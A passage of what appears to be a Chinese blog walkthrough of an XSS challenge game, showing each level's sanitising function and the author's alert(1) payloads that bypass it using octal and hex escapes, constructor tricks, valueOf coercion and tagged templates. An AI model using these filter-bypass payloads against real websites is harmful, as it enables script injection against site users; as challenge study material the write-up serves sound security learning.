rel="noopener">pwntester</a>的博客里看到了一个更好的办法。<br>首先应该注入的payload是<code>&quot;+alert(1))//&quot;</code><br>但是要想办法用相等效果的语句替换掉alert(1)。<br>在博客上看到一个方法也可以触发alert(1)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"sort"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)()</span><br></pre></td></tr></table></figure><p>这个关键在于<code>Function(&quot;code&quot;)</code>。它可以将字符串作为参数传进去，返回一个以传进去的字符串为函数体的匿名函数。所以这个函数可以让你将字符串当作代码来执行。我们可以通过<code>[][&#39;sort&#39;][&#39;constructor&#39;]</code>来获得这个函数。<br><img src="/image/3.png" alt><br>顺便简单说一下，<code>[]</code>定义了一个空数组，数组自带了很多方法，<code>sort</code>是其中一个，还有很多方法，随便用一个都行，这里就用了sort。<code>[][&quot;sort&quot;]</code>的效果相当于<code>[].sort</code>。<br>所有payload可以改为<code>&quot;+[][&quot;sort&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)())+&quot;</code><br>此时又多了一个新的问题，用什么来代替上面的三个字符串呢？<br>这时候就可以用题目Template中用到的方法了，用八进制来代替字母。<br>所以答案就出来了：<br>solution(99): <code>&quot;+[][&quot;\160\157\160&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&#39;\141\154\145\162\164(1)&#39;)()+&quot;</code>  </p><p><br><br><br><br></p><h1 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tag = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For this one, you get to run any code you want, but in a "sandboxed" iframe.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Alerting from 4i.am won't count.</span></span><br><span class="line"></span><br><span class="line">  s = <span class="string">'&lt;script&gt;'</span> + s + <span class="string">'&lt;\/script&gt;'</span>;</span><br><span class="line">  tag.src = <span class="string">'https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw='</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.WINNING = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; youWon = <span class="literal">true</span>; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(<span class="string">'onload'</span>, <span class="string">'youWon &amp;&amp; alert(1)'</span>);</span><br><span class="line">  <span class="keyword">return</span> tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题其实也挺好玩的，如果比较熟悉iframe的特性的话，其实也很简单很快就做出来了，但是如果不知道的话，那就挺花时间的了。<br>这题关键在于使得<code>youWon</code>这个变量的值为true，然后就可以触发alert(1)了。首先看一下我们注入的地方是一个URL，题目有说，这个url页面返回的页面就是我们输入的内容。也就是说iframe的内容是由我们决定的。<br>我们的输入会包裹在一个<code>script</code>标签里面。<br>要做出这道题，我们要知道两点iframe的特性</p><ol><li>iframe的name属性值，同时会注入到父页面的全局窗口对象中。</li><li>iframe的name属性，则iframe的window.name的值同时会设置为这个name属性值。反过来也是一样的，不过有个前提时iframe并没有设置name属性。也就是说如果设置了iframe的window.name，同时也会将iframe的name属性值设置为同样的值（前提是它不存在的话，不能被覆盖）</li></ol><p>所以，答案出来了。<br>solution(13)： <code>name=&#39;youWon&#39;</code><br><br><br><br><br></p><h1 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">html</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> s.replace(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">'&amp;#'</span> + s.charCodeAt(<span class="number">0</span>) + <span class="string">';'</span>; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="string">'&lt;script&gt;'</span> +</span><br><span class="line">      <span class="string">'var url = '</span> + json(s) + <span class="string">'; // We\'ll use this later '</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;\n\n'</span> +</span><br><span class="line">    <span class="string">'  &lt;!-- for debugging --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  URL: '</span> + html(s) + <span class="string">'\n\n'</span> +</span><br><span class="line">    <span class="string">'&lt;!-- then suddenly --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n'</span> +</span><br><span class="line">    <span class="string">'  else new Image().src = url;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;'</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题思路也是由刚刚那个博主提供的。原理我暂时也不是很清楚。大概意思就是在HTML5中如果遇到<code>&lt;!--&lt;script&gt;</code>，就会认为接下的代码是JS代码，直到遇到结束的<code>script</code>标签，但是必须得保证有相应的<code>-&gt;</code>，否则会认为语法出错的。<br>具体的内容可以到刚刚那个博主里看吧，我就直接给出答案了。<br>solution(25): <code>if(alert(1)/*&lt;!--&lt;script&gt;</code><br><br><br><br><br></p><h1 id="JSON-Ⅲ"><a href="#JSON-Ⅲ" class="headerlink" title="JSON Ⅲ"></a>JSON Ⅲ</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></span><br><span class="line">      <span class="comment">// bytes by only escaping those.</span></span><br><span class="line">      <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;).join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用上一题的办法就可以做出来了。<br>solution(29): <code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code><br>分析一下这个答案。<br>输入这个答案，会输入如下结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>因为我们注入了<code>&lt;!--&lt;script&gt;</code>，导致parser将这一段都当作JS来处理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")</span></span><br></pre></td></tr></table></figure><p>js引擎会解析成如下的样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;junk_string&quot;) &lt; /junk_regexp/ ; alert(1) // --&gt;</span><br></pre></td></tr></table></figure><p>其中<br>junk_string代表： <code>&lt;!--&lt;script&gt;</code><br>junk_regexp代表： <code>script&gt;&lt;script&gt;console.log(&quot;&quot;)</code><br>我们的solution中注入的其中两个字符<code>)/</code>就为了欺骗JS引擎，JS引擎会将两个斜杠之间的内容当作正则表达式处理，用这个办法来闭合掉这些多余的字符。<br><br><br><br><br></p><h1 id="Skandia-Ⅲ"><a href="#Skandia-Ⅲ" class="headerlink" title="Skandia Ⅲ"></a>Skandia Ⅲ</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题和上一题<code>Skandia ][</code>差不多的做法。不过因为过滤多了一个反斜杆，所以不能用八进制来代替了。那就要换一种思路。<br>先来看看下面的表格。<br><img src="/image/1.png" alt><br>这里的表格是说，左边的输入是可以返回右边的字符串的。大家可以在试试。<br>所以可以用这个办法来获取我们需要的字符串<br><img src="/image/2.png" alt><br>所以最后的payload(246):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"+[][(''+!1)[3]+(''+&#123;&#125;)[1]+(''+!0)[1]+(''+!0)[0]][(''+&#123;&#125;)[5]+(''+&#123;&#125;)[1]+(''+&#123;&#125;[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+&#123;&#125;)[5]+(''+!0)[0]+(''+&#123;&#125;)[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"</span>(<span class="number">1</span>)<span class="string">")())//`</span></span><br></pre></td></tr></table></figure><p>如果把我们所需要的字母都赋给一个变量，那么这个payload可以更短一些</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="string">''</span>+!<span class="number">1</span>+!<span class="number">0</span>+&#123;&#125;[<span class="number">0</span>]+&#123;&#125;  <span class="comment">//_="falsetrueundefined[object Object]"</span></span><br></pre></td></tr></table></figure><p>所以payload可以缩短成144个字符：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");_=''+!1+!0+&#123;&#125;[0]+&#123;&#125;;[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(i++) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></span><br><span class="line"><span class="comment">// (which compiles and executes a string) if all the characters not</span></span><br><span class="line"><span class="comment">// enclosed in strings are in the set of characters that form JSON</span></span><br><span class="line"><span class="comment">// tokens."</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="regexp">/[^,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</span><br><span class="line">          text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">      <span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">''</span> + val);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>据说这题是基于真实的案例，<a href="https://twitter.com/WisecWisec" target="_blank" rel="noopener">Stefano Di Paola</a>记载在这篇<a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html" target="_blank" rel="noopener">文章</a>中。<br>仔细看一下这个表达式，它是允许我们输入<code>self</code>的，如果是这样的话，我们就可以通过它来调用全局函数<code>the_easy_but_expensive_way_out</code>了。<br>这题的技巧就是让一个对象和一个值或者一个字符相加。这样JS引擎就会去计算我们的对象的值，怎么计算呢？就是调用这个对象的<code>valueOf</code>方法，如果我们将valueOf方法定义为题目中的<code>the_easy_but_expenssive_way_out</code>，，就可以触发alert函数了，但是由于是alert(i++)，i从0开始，所以我们要调用两次。<br>solution(103): <code>{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}+0,{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}</code><br>需要提醒的是，第一次是由<code>eval</code>调用，第二次是由<code>console.log</code>调用。<br><br><br><br><br></p><h1 id="Brunn"><a href="#Brunn" class="headerlink" title="Brunn"></a>Brunn</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  http:<span class="comment">//www.avlidienbrunn.se/xsschallenge/</span></span><br><span class="line"></span><br><span class="line">  s = s.replace(<span class="regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt; var email = '"</span> + s + <span class="string">"'; &lt;\/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分号尖括号都被过滤掉了，所以普通的办法是无效的。但是上一题的方法还是有用。<br>所以应该构造的payload是：<br><code>&#39;+{valueOf:Function(&#39;alert(1)&#39;)}//</code><br>或者<code>&#39;+{valueOf:function(){alert(1)}}//</code><br>或者<code>&#39;+{valueOf:()=&gt;{alert(1)}}//</code><br>或者<code>&#39;+{valueOf:a=&gt;{alert(1)}}//</code><br>但是有新的一个问题就是不能使用小括号和中括号。<br>对于这个问题，可以用<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals" target="_blank" rel="noopener">Tag Function</a>来解决这个问题。<br>solution(85):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+&#123;valueOf:Function`a$&#123;'</span>alert<span class="string">'+String.fromCharCode`40`+1+String.fromCharCode`41`&#125;`&#125;//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="No"><a href="#No" class="headerlink" title="No"></a>No</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/[()`&lt;]/g</span>, <span class="string">''</span>); <span class="comment">// no function calls</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">           <span class="string">'var string = "'</span> + s + <span class="string">'";\n'</span> +</span><br><span class="line">           <span class="string">'console.log(string);\n'</span> +</span><br><span class="line">           <span class="string">'&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：<a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/" target="_blank" rel="noopener">XSS technique without parentheses</a><br>solution(39): <code>&quot;;onerror=eval;throw&#39;=alert\x281\x29&#39;//</code><br><br><br><br><br></p><h1 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题要用的办法还是和题目一样Skandia ][]，但是不用全部都用八进制来替换，只要替换掉元音字母就可以了。<br>solution(60):  <code>&quot;,[][&quot;p\x6fp&quot;][&quot;c\x6fnstr\x75ct\x6fr&quot;](&#39;\x61l\x65rt(1)&#39;)(),&quot;</code></p><p><br><br><br><br></p><h1 id="K’Z’K-1"><a href="#K’Z’K-1" class="headerlink" title="K’Z’K"></a>K’Z’K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels and escape sequences in honor of K'Z'K </span></span><br><span class="line">    <span class="comment">// y is only sometimes a vowel, so it's only removed as a literal</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题有个正则替换，将我们的八进制或者十六进制都给替换成空了，但是我们可以结合上一题的做法和题目JSON ][的方法就可以了。<br>solution(85): <code>&quot;);[][&quot;p\x\x6f6fp&quot;][&quot;c\x\x6f6fnstr\x\x7575ct\x\x6f6fr&quot;](&#39;\x\x6161l\x\x6565rt(1)&#39;)()//</code></p><p><br><br><br><br></p><h1 id="K’Z’K-2"><a href="#K’Z’K-2" class="headerlink" title="K’Z’K"></a>K’Z’K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;\\]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题复杂一点，没想到好办法。所以还是用老办法。<br>solution(190): </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="Fruit-1"><a href="#Fruit-1" class="headerlink" title="Fruit 1"></a>Fruit 1</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'SCRIPT'</span> === n.tagName) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目的漏洞来源于代码的逻辑不严谨。<br>关键在于第6行中的<code>i&lt;n.attributes.length</code>，但是这个length是动态变化的，导致如果有多个属性的时候，就还剩下一个属性是删不掉了。<br>这样的话我们就构造多个属性好了，将<code>onload=alert(1)</code>放后面。<br>solution(26): <code>&lt;iframe t onload=alert(1)&gt;</code></p><p><br><br><br><br></p><h1 id="Fruit-2"><a href="#Fruit-2" class="headerlink" title="Fruit 2"></a>Fruit 2</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题改变了第五行的if语句，看不出来会带来什么不同的影响。<br>至少对于我上一题的解法没影响，所以用同样的方法就可以。<br><br><br><br><br></p><h1 id="Fruit-3"><a href="#Fruit-3" class="headerlink" title="Fruit 3"></a>Fruit 3</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); i--; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不会。<br><br><br><br><br></p><h1 id="Quine"><a href="#Quine" class="headerlink" title="Quine"></a>Quine</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Somebody</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// We've got a quine level in all of the other</span></span><br><span class="line">    